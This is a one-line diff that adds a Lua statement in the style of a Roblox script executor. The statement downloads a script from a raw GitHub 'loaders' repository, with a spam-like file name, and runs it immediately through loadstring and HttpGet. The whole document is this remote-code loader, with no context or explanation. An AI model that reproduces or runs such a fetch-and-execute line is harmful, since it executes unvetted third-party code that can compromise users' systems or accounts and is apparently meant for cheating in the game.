@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/german-moped-days-update-fix-spam7-ajl48l4jmcgsjj.lua"))()
